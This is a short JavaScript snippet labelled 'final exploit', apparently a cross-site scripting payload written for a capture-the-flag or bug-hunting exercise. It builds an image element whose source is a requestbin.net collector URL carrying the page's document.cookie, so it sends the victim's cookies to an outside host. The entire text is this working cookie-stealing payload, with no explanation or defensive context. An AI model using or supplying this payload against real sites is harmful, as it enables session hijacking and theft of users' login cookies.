// final exploit
var i = document.createElement("img");
var ngrok = "http://v1.requestbin.net/r/h4zjh2wq";
i.src = ngrok + "/?leak="+encodeURIComponent(document.cookie);
